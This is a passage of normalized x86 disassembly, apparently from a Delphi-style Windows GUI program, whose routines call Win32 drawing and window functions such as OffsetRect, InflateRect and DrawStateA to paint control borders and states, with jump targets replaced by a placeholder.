mov eax [ eax + 0x14 ]
xor edx edx
call sub_424d8c
jmp r-xdata
mov eax [ ebx + 0x1ac ]
call sub_48254c
mov edx [ eax + 0x48 ]
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x10 ]
call sub_424990
mov eax ebx
call sub_44c2bc
mov ecx eax
sar ecx 0x1
jns r-xdata
sub_485eb8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
mov ebx eax
mov eax [ ebp + 0x10 ]
call sub_4044e8
xor eax eax
push ebp
push sub_485f1f
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push 0x6
lea eax [ ebp - 0x10 ]
push eax
call OffsetRect
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_478cbc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_485f26
lea eax [ ebp + 0x10 ]
call sub_404038
retn
sub_485f30
push ebx
push esi
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_4784c0
mov esi [ ebx + 0x160 ]
mov eax [ ebx + 0x1ac ]
call sub_48254c
mov edx [ eax + 0x50 ]
mov eax [ esi + 0x10 ]
call sub_424990
mov eax [ esi + 0x10 ]
call sub_424988
mov edx eax
mov eax [ esi + 0x14 ]
call sub_424c70
push 0x3
lea ecx [ esp + 0x4 ]
mov edx [ ebx + 0x4c ]
sar edx 0x1
jns r-xdata
sub edx 0x3
mov eax [ ebx + 0x48 ]
sub eax 0xb
call sub_41725c
lea ecx [ esp + 0x4 ]
mov dl 0x1
mov eax [ ebx + 0x160 ]
call sub_46ed34
pop ecx
pop edx
pop esi
pop ebx
retn
adc edx 0x0
sub_485fa0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
call sub_4044e8
xor eax eax
push ebp
push sub_485ff1
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push 0x6
push esi
call OffsetRect
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_478dd0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_485ff8
lea eax [ ebp + 0x8 ]
call sub_404038
retn
sub_486004
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
add ebx 0xfffffffc
mov eax [ ebx ]
call sub_4795d4
call sub_48254c
mov edx [ eax + 0x68 ]
mov eax [ ebx ]
mov eax [ eax + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424c70
mov eax [ ebx ]
call sub_4840c8
call sub_48254c
mov edx [ eax + 0x38 ]
mov eax [ ebx ]
mov eax [ eax + 0x160 ]
mov eax [ eax + 0x10 ]
call sub_424990
mov eax [ ebx ]
mov eax [ eax + 0x48 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x4c ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x160 ]
xor ecx ecx
xor edx edx
call sub_425218
push 0xffffffff
push 0xffffffff
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
push eax
call InflateRect
pop ebx
pop ebp
retn
sub_48607c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4840c8
call sub_48254c
mov edx [ eax + 0x40 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424c70
mov eax [ ebp - 0x4 ]
call sub_4840c8
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1ab ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4840c8
cmp [ eax + 0x296 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_470de0
pop ebx
mov esp ebp
pop ebp
retn
push ebp
call sub_486004
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x18a ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x16c ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_4795d4
call sub_48254c
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424c70
mov eax [ ebp - 0x4 ]
call sub_4840c8
call sub_48254c
mov edx [ eax + 0x7c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
mov eax [ eax + 0x10 ]
call sub_424990
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
mov eax [ eax + 0x14 ]
mov dl 0x1
call sub_424d8c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
xor ecx ecx
xor edx edx
call sub_425218
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
call sub_44c214
lea edx [ ebp - 0x20 ]
lea ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_44c38c
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x16c ]
mov eax [ eax + 0x18 ]
call sub_44c214
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0xc ]
jg r-xdata
mov eax [ ebp - 0x4 ]
call sub_4795d4
mov eax [ eax + 0x2c4 ]
mov eax [ eax + 0x2b0 ]
call sub_42c354
dec eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
dec eax
mov [ ebp - 0xc ] eax
xor eax eax
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4795d4
call sub_48254c
mov edx [ eax + 0x68 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424c70
push ebp
call sub_486004
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4840c8
call sub_48254c
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
mov eax [ eax + 0x10 ]
call sub_424990
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
mov ebx [ ebp - 0xc ]
mov ecx ebx
mov edx 0x1
call sub_42517c
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x48 ]
dec edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
mov ecx ebx
call sub_42511c
push 0xffffffff
push 0xffffffff
mov eax [ ebp - 0x8 ]
push eax
call InflateRect
jmp r-xdata
sub_486288
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
call sub_4044e8
xor eax eax
push ebp
push sub_4862d9
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push 0x1
push esi
call OffsetRect
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_4794c0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4862e0
lea eax [ ebp + 0x8 ]
call sub_404038
retn
sub_4862e8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_475d6c
xor edx edx
mov eax esi
call sub_4818c4
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax esi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_486328
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
lea eax [ esi + 0x318 ]
call sub_40d4f0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_475e64
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_486358
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_476d08
cmp [ ebx + 0x314 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x104 ]
test al al
jne r-xdata
mov esi [ ebx + 0x210 ]
test esi esi
je r-xdata
mov eax [ ebx + 0x318 ]
test eax eax
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov edx [ ebx + 0x210 ]
mov edx [ edx + 0x40 ]
call sub_46f5dc
mov eax [ esi + 0x40 ]
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
cmp [ ebx + 0x318 ] 0x0
jne r-xdata
push 0x0
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_46f4b0
mov [ ebx + 0x318 ] eax
sub_486408
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
lea ebx [ ebp - 0x30 ]
lea eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4530b8
push eax
call GetClientRect
push ebx
mov eax [ ebp - 0x4 ]
call sub_4530b8
push eax
call GetWindowRect
push 0x2
push ebx
mov eax [ ebp - 0x4 ]
call sub_4530b8
push eax
push 0x0
call MapWindowPoints
mov eax [ ebx + 0x4 ]
neg eax
push eax
mov eax [ ebx ]
neg eax
push eax
lea eax [ ebp - 0x20 ]
push eax
call OffsetRect
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x20 ]
push eax
push esi
call ExcludeClipRect
mov eax [ ebx + 0x4 ]
neg eax
push eax
mov eax [ ebx ]
neg eax
push eax
push ebx
call OffsetRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
call sub_425570
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_48674f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
mov edx esi
call sub_4255f0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
mov eax [ eax + 0x10 ]
mov edx 0x1
call sub_424a9c
mov eax [ ebp - 0x4 ]
call sub_48254c
mov edx [ eax + 0x7c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
mov eax [ eax + 0x10 ]
call sub_424990
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
mov ecx [ ebx + 0x4 ]
mov edx [ ebx + 0x8 ]
call sub_42517c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
mov ecx [ ebx + 0x4 ]
mov edx [ ebx ]
call sub_42511c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
mov ecx [ ebx + 0xc ]
mov edx [ ebx ]
call sub_42511c
mov eax [ ebp - 0x4 ]
call sub_48254c
mov edx [ eax + 0x78 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
mov eax [ eax + 0x10 ]
call sub_424990
mov ecx [ ebx + 0x4 ]
inc ecx
mov edx [ ebx + 0x8 ]
dec edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
call sub_42517c
mov ecx [ ebx + 0x4 ]
inc ecx
mov edx [ ebx ]
inc edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
call sub_42511c
mov ecx [ ebx + 0xc ]
sub ecx 0x2
mov edx [ ebx ]
inc edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
call sub_42511c
mov eax [ ebp - 0x4 ]
call sub_48254c
mov edx [ eax + 0x84 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
mov eax [ eax + 0x10 ]
call sub_424990
mov edx [ ebx + 0x8 ]
dec edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
mov ecx [ ebx + 0x4 ]
call sub_42517c
mov ecx [ ebx + 0xc ]
dec ecx
mov edx [ ebx + 0x8 ]
dec edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
call sub_42511c
mov ecx [ ebx + 0xc ]
dec ecx
mov edx [ ebx ]
dec edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
call sub_42511c
mov eax [ ebp - 0x4 ]
call sub_48254c
mov edx [ eax + 0x80 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
mov eax [ eax + 0x10 ]
call sub_424990
mov ecx [ ebx + 0x4 ]
inc ecx
mov edx [ ebx + 0x8 ]
sub edx 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
call sub_42517c
mov ecx [ ebx + 0xc ]
sub ecx 0x2
mov edx [ ebx + 0x8 ]
sub edx 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
call sub_42511c
mov ecx [ ebx + 0xc ]
sub ecx 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
mov edx [ ebx ]
call sub_42511c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x210 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_486756
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
mov edx [ ebp - 0x8 ]
call sub_4255f0
retn
mov eax [ ebp - 0x4 ]
call sub_48254c
mov esi [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
call sub_48254c
cmp esi [ eax + 0x7c ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2ac ]
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
lea edx [ ebp - 0x40 ]
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x2ac ]
mov eax esi
call sub_44c214
lea edx [ ebp - 0x40 ]
lea ecx [ ebp - 0x10 ]
mov eax [ esi + 0x30 ]
call sub_44c38c
lea edx [ ebp - 0x40 ]
mov eax [ ebp - 0x4 ]
call sub_44c214
mov eax [ ebp - 0x34 ]
cmp eax [ ebp - 0xc ]
jg r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebx + 0xc ]
dec eax
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ ebp - 0x10 ]
mov edx ebx
sub edx [ eax + 0x40 ]
inc edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
mov esi [ ebp - 0xc ]
mov ecx esi
call sub_42517c
mov eax [ ebp - 0x4 ]
call sub_48254c
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
mov eax [ eax + 0x10 ]
call sub_424990
mov eax [ ebp - 0x4 ]
mov edx ebx
sub edx [ eax + 0x40 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2ac ]
add edx [ eax + 0x48 ]
dec edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
mov ecx esi
call sub_42511c
sub_48675c
push ebx
push esi
add esp 0xfffffff0
mov esi ecx
mov ebx eax
mov ecx esi
mov eax ebx
call sub_4763a8
mov eax esi
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov edx esp
mov eax [ esi + 0x30 ]
call sub_44c214
mov eax [ esp ]
cmp eax [ ebx + 0x40 ]
jge r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov edx esp
mov eax esi
call sub_44c214
mov eax [ esp ]
cmp eax [ ebx + 0x40 ]
jge r-xdata
mov edx esp
mov eax [ esi + 0x30 ]
call sub_44c214
mov edx [ esp + 0x8 ]
dec edx
mov eax ebx
call sub_44bfbc
jmp r-xdata
mov edx [ ebx + 0x40 ]
dec edx
mov eax ebx
call sub_44bfbc
sub_4867dc
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x2ac ]
mov eax esi
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov eax ebx
call sub_476b58
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_486808
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax ebx
call sub_475d54
call sub_48254c
mov edx [ eax + 0x74 ]
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424c70
mov edx esi
mov eax [ ebx + 0x160 ]
call sub_4250a4
push esi
lea edi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esp + 0x8 ] 0x18
mov eax ebx
call sub_475d54
call sub_48254c
mov edx [ eax + 0x34 ]
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424c70
mov edx esp
mov eax [ ebx + 0x160 ]
call sub_4250a4
cmp [ ebx + 0x1ae ] 0x2
je r-xdata
push 0x1
push 0x0
push esi
call OffsetRect
push 0xfffffffc
push 0xfffffffe
push esi
call InflateRect
mov eax ebx
call sub_475d54
call sub_48254c
mov edx [ eax + 0x68 ]
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424c70
mov edx esi
mov eax [ ebx + 0x160 ]
call sub_4250a4
cmp [ ebx + 0x1ad ] 0x0
je r-xdata
cmp [ ebx + 0x1ab ] 0x0
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc0 ]
test al al
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_4868e8
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x1ae ] 0x2
je r-xdata
push 0x1
push 0x0
lea eax [ esp + 0x8 ]
push eax
call OffsetRect
push 0xfffffffc
push 0xfffffffe
lea eax [ esp + 0x8 ]
push eax
call InflateRect
mov eax ebx
call sub_4840c8
call sub_48254c
mov edx [ eax + 0x38 ]
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x10 ]
call sub_424990
mov edx esp
mov eax [ ebx + 0x160 ]
call sub_425260
cmp [ ebx + 0x1ad ] 0x0
je r-xdata
cmp [ ebx + 0x1ab ] 0x0
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc0 ]
test al al
je r-xdata
sub_48697c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov eax ebx
call sub_4840c8
call sub_48254c
mov edx [ eax + 0x40 ]
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424c70
mov eax ebx
call sub_4840c8
mov edx [ eax ]
call [ edx + 0x104 ]
test al al
jne r-xdata
cmp [ ebx + 0x1ab ] 0x0
jne r-xdata
mov esi [ ebx + 0x16c ]
test esi esi
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc0 ]
test al al
je r-xdata
mov eax ebx
call sub_4840c8
call sub_48254c
mov edx [ eax + 0x40 ]
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424c70
jmp r-xdata
cmp [ esi + 0x50 ] 0x0
jne r-xdata
mov edx edi
mov eax ebx
call sub_470de0
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_4840c8
call sub_48254c
mov edx [ eax + 0x68 ]
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424c70
jmp r-xdata
sub_486a30
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov eax ebx
call sub_4840c8
mov edx [ eax ]
call [ edx + 0x104 ]
test al al
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
cmp [ ebx + 0x1ae ] 0x2
je r-xdata
mov eax ebx
call sub_4840c8
call sub_48254c
mov edx [ eax + 0x38 ]
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x10 ]
call sub_424990
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x14 ]
mov dl 0x1
call sub_424d8c
mov edx esp
mov eax [ ebx + 0x160 ]
call sub_425260
cmp [ ebx + 0x1ad ] 0x0
je r-xdata
cmp [ ebx + 0x1ab ] 0x0
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc0 ]
test al al
je r-xdata
sub_486acc
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ edx ]
mov [ ebp - 0x14 ] eax
mov eax [ edx + 0x4 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
call sub_4840c8
mov edx [ eax ]
call [ edx + 0x104 ]
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1ab ] 0x0
je r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_482c8c
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1ae ] 0x2
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc0 ]
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc0 ]
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
call sub_485664
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x16c ]
call sub_47ecd0
test al al
je r-xdata
inc [ ebp - 0x14 ]
inc [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424c68
mov [ ebp - 0x8 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42984c
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_486c5c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x16c ]
call sub_47eb64
mov ebx [ eax + 0x5c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x16c ]
mov edx [ eax + 0x58 ]
mov eax [ ebx + 0x38 ]
mov ecx [ ebp - 0xc ]
call sub_45a4d8
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_4032a8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_424c70
retn
mov eax [ ebp - 0x4 ]
call sub_4840c8
call sub_48254c
mov eax [ eax + 0x68 ]
mov edx 0xffffffce
call sub_46ec74
mov edx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424c70
mov eax [ ebx + 0x38 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebx + 0x38 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
push 0x84
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
inc eax
push eax
mov eax [ ebp - 0x14 ]
inc eax
push eax
push 0x0
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x64 ]
push eax
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424ca4
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_425570
push eax
call DrawStateA
sub_486cbc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
call sub_4044e8
xor eax eax
push ebp
push sub_486d3e
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x1ab ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_483284
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_486d45
lea eax [ ebp + 0x8 ]
call sub_404038
retn
mov eax ebx
call sub_4840c8
call sub_48254c
cmp [ eax + 0x5c ] 0x20000000
je r-xdata
mov eax ebx
call sub_4840c8
call sub_48254c
mov edx [ eax + 0x5c ]
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0xc ]
call sub_4244a4
sub_486d4c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov eax ebx
call sub_4840c8
call sub_48254c
mov edx [ eax + 0x40 ]
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424c70
mov eax ebx
call sub_4840c8
mov edx [ eax ]
call [ edx + 0x104 ]
test al al
jne r-xdata
cmp [ ebx + 0x1ab ] 0x0
jne r-xdata
cmp [ ebx + 0x16c ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc0 ]
test al al
je r-xdata
mov eax ebx
call sub_4840c8
call sub_48254c
mov edx [ eax + 0x40 ]
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424c70
jmp r-xdata
mov eax ebx
call sub_4840c8
call sub_48254c
mov edx [ eax + 0x68 ]
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424c70
jmp r-xdata
mov edx esi
mov eax ebx
call sub_470de0
pop esi
pop ebx
retn
sub_486df8
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_4840c8
mov edx [ eax ]
call [ edx + 0x104 ]
test al al
jne r-xdata
cmp [ ebx + 0x1ab ] 0x0
jne r-xdata
cmp [ ebx + 0x16c ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc0 ]
test al al
je r-xdata
mov eax ebx
call sub_4840c8
call sub_48254c
mov edx [ eax + 0x38 ]
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x10 ]
call sub_424990
sub [ esp + 0x8 ] 0x9
mov edx esp
mov eax [ ebx + 0x160 ]
call sub_425260
mov eax [ esp + 0x8 ]
dec eax
mov [ esp ] eax
add [ esp + 0x8 ] 0x9
mov edx esp
mov eax [ ebx + 0x160 ]
call sub_425260
sub_486e98
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ edx ]
mov [ ebp - 0x14 ] eax
mov eax [ edx + 0x4 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
call sub_4840c8
mov edx [ eax ]
call [ edx + 0x104 ]
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1ab ] 0x0
je r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_482c8c
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1ae ] 0x2
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc0 ]
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc0 ]
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
call sub_485664
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x16c ]
call sub_47ecd0
test al al
je r-xdata
inc [ ebp - 0x14 ]
inc [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424c68
mov [ ebp - 0x8 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42984c
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_487022
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x3c ]
mov ebx [ eax + 0x5c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x16c ]
mov edx [ eax + 0x58 ]
mov eax [ ebx + 0x38 ]
mov ecx [ ebp - 0xc ]
call sub_45a4d8
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
